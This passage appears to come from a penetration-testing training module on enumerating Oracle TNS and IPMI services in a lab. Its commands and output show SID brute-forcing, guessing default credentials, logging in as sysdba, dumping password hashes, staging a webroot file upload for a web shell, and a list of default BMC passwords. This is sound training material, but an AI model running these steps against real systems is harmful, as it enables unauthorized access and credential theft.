      (<span class="hljs-name">ADDRESS</span> = (<span class="hljs-name">PROTOCOL</span> = TCP)(<span class="hljs-name">HOST</span> = <span class="hljs-number">10.129</span>.<span class="hljs-number">11.102</span>)(<span class="hljs-name">PORT</span> = <span class="hljs-number">1521</span>))
    )
    (<span class="hljs-name">CONNECT_DATA</span> =
      (<span class="hljs-name">SERVER</span> = DEDICATED)
      (<span class="hljs-name">SERVICE_NAME</span> = orcl)
    )
  )
</code></pre>
<p>Here we can see a service called <code>ORCL</code>, which is listening on port <code>TCP/1521</code> on the IP address <code>10.129.11.102</code>. Clients should use the service name <code>orcl</code> when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.</p>
<p>On the other hand, the <code>listener.ora</code> file is a server-side configuration file that defines the listener process&#39;s properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p>
<p><strong>Listener.ora</strong></p>
<p>Code: txt</p>
<pre><code class="lang-txt"><span class="hljs-attr">SID_LIST_LISTENER</span> =
  (<span class="hljs-attr">SID_LIST</span> =
    (<span class="hljs-attr">SID_DESC</span> =
      (<span class="hljs-attr">SID_NAME</span> = PDB1)
      (<span class="hljs-attr">ORACLE_HOME</span> = C:\oracle\product\<span class="hljs-number">19.0</span>.<span class="hljs-number">0</span>\dbhome_1)
      (<span class="hljs-attr">GLOBAL_DBNAME</span> = PDB1)
      (<span class="hljs-attr">SID_DIRECTORY_LIST</span> =
        (<span class="hljs-attr">SID_DIRECTORY</span> =
          (<span class="hljs-attr">DIRECTORY_TYPE</span> = TNS_ADMIN)
          (<span class="hljs-attr">DIRECTORY</span> = C:\oracle\product\<span class="hljs-number">19.0</span>.<span class="hljs-number">0</span>\dbhome_1\network\admin)
        )
      )
    )
  )

<span class="hljs-attr">LISTENER</span> =
  (<span class="hljs-attr">DESCRIPTION_LIST</span> =
    (<span class="hljs-attr">DESCRIPTION</span> =
      (<span class="hljs-attr">ADDRESS</span> = (<span class="hljs-attr">PROTOCOL</span> = TCP)(<span class="hljs-attr">HOST</span> = orcl.inlanefreight.htb)(<span class="hljs-attr">PORT</span> = <span class="hljs-number">1521</span>))
      (<span class="hljs-attr">ADDRESS</span> = (<span class="hljs-attr">PROTOCOL</span> = IPC)(<span class="hljs-attr">KEY</span> = EXTPROC1521))
    )
  )

<span class="hljs-attr">ADR_BASE_LISTENER</span> = C:\oracle
</code></pre>
<p>In short, the client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p>
<p>Oracle databases can be protected by using so-called PL/SQL Exclusion List (<code>PlsqlExclusionList</code>). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DESCRIPTION</code></td>
<td>A descriptor that provides a name for the database and its connection type.</td>
</tr>
<tr>
<td><code>ADDRESS</code></td>
<td>The network address of the database, which includes the hostname and port number.</td>
</tr>
<tr>
<td><code>PROTOCOL</code></td>
<td>The network protocol used for communication with the server</td>
</tr>
<tr>
<td><code>PORT</code></td>
<td>The port number used for communication with the server</td>
</tr>
<tr>
<td><code>CONNECT_DATA</code></td>
<td>Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.</td>
</tr>
<tr>
<td><code>INSTANCE_NAME</code></td>
<td>The name of the database instance the client wants to connect.</td>
</tr>
<tr>
<td><code>SERVICE_NAME</code></td>
<td>The name of the service that the client wants to connect to.</td>
</tr>
<tr>
<td><code>SERVER</code></td>
<td>The type of server used for the database connection, such as dedicated or shared.</td>
</tr>
<tr>
<td><code>USER</code></td>
<td>The username used to authenticate with the database server.</td>
</tr>
<tr>
<td><code>PASSWORD</code></td>
<td>The password used to authenticate with the database server.</td>
</tr>
<tr>
<td><code>SECURITY</code></td>
<td>The type of security for the connection.</td>
</tr>
<tr>
<td><code>VALIDATE_CERT</code></td>
<td>Whether to validate the certificate using SSL/TLS.</td>
</tr>
<tr>
<td><code>SSL_VERSION</code></td>
<td>The version of SSL/TLS to use for the connection.</td>
</tr>
<tr>
<td><code>CONNECT_TIMEOUT</code></td>
<td>The time limit in seconds for the client to establish a connection to the database.</td>
</tr>
<tr>
<td><code>RECEIVE_TIMEOUT</code></td>
<td>The time limit in seconds for the client to receive a response from the database.</td>
</tr>
<tr>
<td><code>SEND_TIMEOUT</code></td>
<td>The time limit in seconds for the client to send a request to the database.</td>
</tr>
<tr>
<td><code>SQLNET.EXPIRE_TIME</code></td>
<td>The time limit in seconds for the client to detect a connection has failed.</td>
</tr>
<tr>
<td><code>TRACE_LEVEL</code></td>
<td>The level of tracing for the database connection.</td>
</tr>
<tr>
<td><code>TRACE_DIRECTORY</code></td>
<td>The directory where the trace files are stored.</td>
</tr>
<tr>
<td><code>TRACE_FILE_NAME</code></td>
<td>The name of the trace file.</td>
</tr>
<tr>
<td><code>LOG_FILE</code></td>
<td>The file where the log information is stored.</td>
</tr>
</tbody>
</table>
<p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our <code>Pwnbox</code> instance in case it does not have these already. Here is a Bash script that does all of that:</p>
<p><strong>Oracle-Tools-setup.sh</strong></p>
<p>Code: bash</p>
<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
</span>
sudo apt-get install libaio1 python3-dev alien -y
git <span class="hljs-built_in">clone</span> https://github.com/quentinhardy/odat.git
<span class="hljs-built_in">cd</span> odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
<span class="hljs-built_in">export</span> LD_LIBRARY_PATH=instantclient_21_12:<span class="hljs-variable">$LD_LIBRARY_PATH</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$LD_LIBRARY_PATH</span>:<span class="hljs-variable">$PATH</span>
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete &amp;&amp; sudo activate-global-python-argcomplete
</code></pre>
<p>After that, we can try to determine if the installation was successful by running the following command:</p>
<p><strong>Testing ODAT</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|<span class="hljs-string">  \ / \</span>|<span class="hljs-string">_ _</span>|
          ( o ) o ) o ||<span class="hljs-string"> </span>|<span class="hljs-string"> 
           \_/</span>|<span class="hljs-string">__/</span>|<span class="hljs-string">_n_</span>||<span class="hljs-string">_</span>|<span class="hljs-string"> 
-------------------------------------------
  _        __           _           ___ 
 / \      </span>|<span class="hljs-string">  \         / \         </span>|<span class="hljs-string">_ _</span>|
( o )       o )         o |<span class="hljs-string">         </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 
 \_/racle </span>|<span class="hljs-string">__/atabase </span>|<span class="hljs-string">_n_</span>|<span class="hljs-string">ttacking </span>|<span class="hljs-string">_</span>|<span class="hljs-string">ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...</span>
</code></pre>
<p>Oracle Database Attacking Tool (<code>ODAT</code>) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p>
<p>Let&#39;s now use <code>nmap</code> to scan the default Oracle TNS listener port.</p>
<p><strong>Nmap</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -p1521 -sV <span class="hljs-number">10.129</span><span class="hljs-meta">.204</span><span class="hljs-meta">.235</span> --open

Starting Nmap <span class="hljs-number">7.93</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">06</span> <span class="hljs-number">10</span>:<span class="hljs-number">59</span> EST
Nmap scan report for <span class="hljs-number">10.129</span><span class="hljs-meta">.204</span><span class="hljs-meta">.235</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>0041s latency).

PORT     STATE SERVICE    VERSION
<span class="hljs-number">1521</span>/tcp open  oracle-tns Oracle TNS listener <span class="hljs-number">11.2</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span><span class="hljs-meta">.0</span> (unauthorized)

Service detection performed. Please report any incorrect results <span class="hljs-meta">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">6.64</span> seconds
</code></pre>
<p>We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (<code>SID</code>) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database&#39;s data. When a client connects to an Oracle database, it specifies the database&#39;s <code>SID</code> along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the <code>tnsnames.ora</code> file is used.</p>
<p>The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.</p>
<p>There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like <code>nmap</code>, <code>hydra</code>, <code>odat</code>, and others. Let us use <code>nmap</code> first.</p>
<p><strong>Nmap - SID Bruteforcing</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -p1521 -sV <span class="hljs-number">10.129</span><span class="hljs-meta">.204</span><span class="hljs-meta">.235</span> --open --script oracle-sid-brute

Starting Nmap <span class="hljs-number">7.93</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">06</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span> EST
Nmap scan report for <span class="hljs-number">10.129</span><span class="hljs-meta">.204</span><span class="hljs-meta">.235</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>0044s latency).

PORT     STATE SERVICE    VERSION
<span class="hljs-number">1521</span>/tcp open  oracle-tns Oracle TNS listener <span class="hljs-number">11.2</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span><span class="hljs-meta">.0</span> (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results <span class="hljs-meta">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">55.40</span> seconds
</code></pre>
<p>We can use the <code>odat.py</code> tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the <code>all</code> option and try all modules of the <code>odat.py</code> tool.</p>
<p><strong>ODAT</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./odat.py all -s <span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.235</span>

[+] Checking <span class="hljs-keyword">if</span> target <span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.235</span>:<span class="hljs-number">1521</span> is well configured for a connection...
[+] According to a test, the TNS listener <span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.235</span>:<span class="hljs-number">1521</span> is well configured. Continue...

...SNIP...

[!] Notice: <span class="hljs-string">'mdsys'</span> account is locked, so skipping this username for password           #####################| ETA:  <span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">16</span> 
[!] Notice: <span class="hljs-string">'oracle_ocm'</span> account is locked, so skipping this username for password       #####################| ETA:  <span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">05</span> 
[!] Notice: <span class="hljs-string">'outln'</span> account is locked, so skipping this username for password           #####################| ETA:  <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
</code></pre>
<p>In this example, we found valid credentials for the user <code>scott</code> and his password <code>tiger</code>. After that, we can use the tool <code>sqlplus</code> to connect to the Oracle database and interact with it.</p>
<p><strong>SQLplus - Log In</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

<span class="hljs-keyword">ERROR:
</span>ORA<span class="hljs-string">-28002</span>: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL&gt;
</code></pre>
<p>If you come across the following error <code>sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory</code>, please execute the below, taken from <a href="https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared">here</a>.</p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sudo sh -c "echo /usr</span><span class="hljs-regexp">/lib/oracle</span><span class="hljs-regexp">/12.2/client</span>64/<span class="hljs-class"><span class="hljs-keyword">lib</span> &gt; /<span class="hljs-title">etc</span>/<span class="hljs-title">ld</span>.<span class="hljs-title">so</span>.<span class="hljs-title">conf</span>.<span class="hljs-title">d</span>/<span class="hljs-title">oracle</span>-<span class="hljs-title">instantclient</span>.<span class="hljs-title">conf</span>";</span>sudo ldconfig
</code></pre>
<p>There are many <a href="https://docs.oracle.com/cd/E11882\_01/server.112/e41085/sqlqraa001.htm#SQLQR985">SQLplus commands</a> that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:</p>
<p><strong>Oracle RDBMS - Interaction</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">SQL&gt; select table<span class="hljs-emphasis">_name from all_</span>tables;

<span class="hljs-section">TABLE_NAME
------------------------------</span>
DUAL
SYSTEM<span class="hljs-emphasis">_PRIVILEGE_</span>MAP
TABLE<span class="hljs-emphasis">_PRIVILEGE_</span>MAP
STMT<span class="hljs-emphasis">_AUDIT_</span>OPTION<span class="hljs-emphasis">_MAP
AUDIT_</span>ACTIONS
WRR$<span class="hljs-emphasis">_REPLAY_</span>CALL<span class="hljs-emphasis">_FILTER
HS_</span>BULKLOAD<span class="hljs-emphasis">_VIEW_</span>OBJ
HS$<span class="hljs-emphasis">_PARALLEL_</span>METADATA
HS<span class="hljs-emphasis">_PARTITION_</span>COL<span class="hljs-emphasis">_NAME
HS_</span>PARTITION<span class="hljs-emphasis">_COL_</span>TYPE
HELP

...SNIP...


SQL&gt; select * from user<span class="hljs-emphasis">_role_</span>privs;

USERNAME                       GRANTED<span class="hljs-emphasis">_ROLE                   ADM DEF OS_</span>
<span class="hljs-bullet">------------------------------ </span>------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
</code></pre>
<p>Here, the user <code>scott</code> has no administrative privileges. However, we can try using this account to log in as the System Database Admin (<code>sysdba</code>), giving us higher privileges. This is possible when the user <code>scott</code> has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.</p>
<p><strong>Oracle RDBMS - Database Enumeration</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> sqlplus scott/tiger@<span class="hljs-number">10.129</span><span class="hljs-number">.204</span><span class="hljs-number">.235</span>/XE as sysdba

SQL*Plus: Release <span class="hljs-number">21.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> - Production on Mon Mar <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">58</span> <span class="hljs-number">2023</span>
Version <span class="hljs-number">21.4</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>

Copyright (c) <span class="hljs-number">1982</span>, <span class="hljs-number">2021</span>, Oracle. <span class="hljs-keyword">All</span> rights reserved.


Connected to:
Oracle Database <span class="hljs-number">11</span>g Express Edition Release <span class="hljs-number">11.2</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span><span class="hljs-number">.0</span> - <span class="hljs-number">64</span>bit Production


SQL&gt; select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            APEX_ADMINISTRATOR_ROLE        <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            AQ_ADMINISTRATOR_ROLE          <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            AQ_USER_ROLE                   <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            AUTHENTICATEDUSER              <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            CONNECT                        <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            CTXAPP                         <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            DATAPUMP_EXP_FULL_DATABASE     <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            DATAPUMP_IMP_FULL_DATABASE     <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            DBA                            <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            DBFS_ROLE                      <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
SYS                            EXECUTE_CATALOG_ROLE           <span class="hljs-keyword">YES</span> <span class="hljs-keyword">YES</span> <span class="hljs-keyword">NO</span>
...SNIP...
</code></pre>
<p>We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the <code>sys.user$</code> and try to crack them offline. The query for this would look like the following:</p>
<p><strong>Oracle RDBMS - Extract Password Hashes</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">SQL&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">name</span>, password from sys.user$;

<span class="hljs-keyword">NAME</span>                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
<span class="hljs-keyword">PUBLIC</span>
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          A3BA55E08595C81
EXP_FULL_DATABASE

<span class="hljs-keyword">NAME</span>                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
</code></pre>
<p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:</p>
<table>
<thead>
<tr>
<th><strong>OS</strong></th>
<th><strong>Path</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux</td>
<td><code>/var/www/html</code></td>
</tr>
<tr>
<td>Windows</td>
<td><code>C:\inetpub\wwwroot</code></td>
</tr>
</tbody>
</table>
<p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.</p>
<p><strong>Oracle RDBMS - File Upload</strong></p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ echo <span class="hljs-string">"Oracle File Upload Test"</span> &gt; testing<span class="hljs-selector-class">.txt</span>
root@htb[/htb]$ ./odat<span class="hljs-selector-class">.py</span> utlfile -s <span class="hljs-number">10.129</span>.<span class="hljs-number">204.235</span> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing<span class="hljs-selector-class">.txt</span> ./testing<span class="hljs-selector-class">.txt</span>

[<span class="hljs-number">1</span>] (<span class="hljs-number">10.129</span>.<span class="hljs-number">204.235</span>:<span class="hljs-number">1521</span>): Put the ./testing<span class="hljs-selector-class">.txt</span> local file <span class="hljs-keyword">in</span> the C:\inetpub\wwwroot folder like testing<span class="hljs-selector-class">.txt</span> on the <span class="hljs-number">10.129</span>.<span class="hljs-number">204.235</span> server                                                                                                  
[+] The ./testing<span class="hljs-selector-class">.txt</span> file was created on the C:\inetpub\wwwroot directory on the <span class="hljs-number">10.129</span>.<span class="hljs-number">204.235</span> server like the testing<span class="hljs-selector-class">.txt</span> file
</code></pre>
<p>Finally, we can test if the file upload approach worked with <code>curl</code>. Therefore, we will use a <code>GET http://&lt;IP&gt;</code> request, or we can visit via browser.</p>
<p>Oracle TNS</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -X GET http:/</span><span class="hljs-regexp">/10.129.204.235/testing</span>.txt

Oracle File Upload Test
</code></pre>
<h2 id="ipmi">IPMI</h2>
<hr>
<p><a href="https://www.thomas-krenn.com/en/wiki/IPMI\_Basics">Intelligent Platform Management Interface</a> (<code>IPMI</code>) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host&#39;s BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system&#39;s hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:</p>
<ul>
<li>Before the OS has booted to modify BIOS settings</li>
<li>When the host is fully powered down</li>
<li>Access to a host after a system failure</li>
</ul>
<p>When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.</p>
<p>The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:</p>
<ul>
<li>Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI</li>
<li>Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another</li>
<li>Intelligent Platform Management Bus (IPMB) - extends the BMC</li>
<li>IPMI Memory - stores things such as the system event log, repository store data, and more</li>
<li>Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus</li>
</ul>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host&#39;s motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. Below is a sample Nmap scan using the Nmap <a href="https://nmap.org/nsedoc/scripts/ipmi-version.html">ipmi-version</a> NSE script to footprint the service.</p>
<p><strong>Nmap</strong></p>
<p>IPMI</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap -sU --script ipmi-version -p <span class="hljs-number">623</span> ilo.inlanfreight.local

Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-11-04 21:48 GMT</span>
Nmap scan report <span class="hljs-keyword">for</span> ilo.inlanfreight.local (<span class="hljs-number">172.16</span><span class="hljs-number">.2</span><span class="hljs-number">.2</span>)
Host is up (<span class="hljs-number">0.00064</span>s latency).

PORT    STATE SERVICE
<span class="hljs-number">623</span>/udp open  asf-rmcp
| ipmi-<span class="hljs-string">version:</span>
|   <span class="hljs-string">Version:</span>
|     IPMI<span class="hljs-number">-2.0</span>
|   <span class="hljs-string">UserAuth:</span>
|   <span class="hljs-string">PassAuth:</span> auth_user, non_null_user
|_  <span class="hljs-string">Level:</span> <span class="hljs-number">2.0</span>
MAC <span class="hljs-string">Address:</span> <span class="hljs-number">14</span>:<span class="hljs-number">03</span>:<span class="hljs-string">DC:</span><span class="hljs-number">674</span>:<span class="hljs-number">18</span>:<span class="hljs-number">6</span>A (Hewlett Packard Enterprise)

Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.46</span> seconds
</code></pre>
<p>Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi\_version/">IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)</a>.</p>
<p><strong>Metasploit Version Scan</strong></p>
<p>IPMI</p>
<pre><code class="lang-shell-session">msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>
msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  <span class="hljs-number">256</span>              <span class="hljs-literal">yes</span>       The number <span class="hljs-keyword">of</span> hosts <span class="hljs-keyword">to</span> probe <span class="hljs-keyword">in</span> each set
   RHOSTS     <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>    <span class="hljs-literal">yes</span>       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts file <span class="hljs-keyword">with</span> syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
   RPORT      <span class="hljs-number">623</span>              <span class="hljs-literal">yes</span>       The target port (UDP)
   THREADS    <span class="hljs-number">10</span>               <span class="hljs-literal">yes</span>       The number <span class="hljs-keyword">of</span> concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run

[*] Sending IPMI requests <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>-&gt;<span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span> (<span class="hljs-number">1</span> hosts)
[+] <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>:<span class="hljs-number">623</span> - IPMI - IPMI-<span class="hljs-number">2.0</span> UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, <span class="hljs-literal">null</span>) Level(<span class="hljs-number">1.5</span>, <span class="hljs-number">2.0</span>) 
[*] Scanned <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] Auxiliary <span class="hljs-built_in">module</span> execution completed
</code></pre>
<p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p>
<table>
<thead>
<tr>
<th>Product</th>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>Dell iDRAC</td>
<td>root</td>
<td>calvin</td>
</tr>
<tr>
<td>HP iLO</td>
<td>Administrator</td>
<td>randomized 8-character string consisting of numbers and uppercase letters</td>
</tr>
<tr>
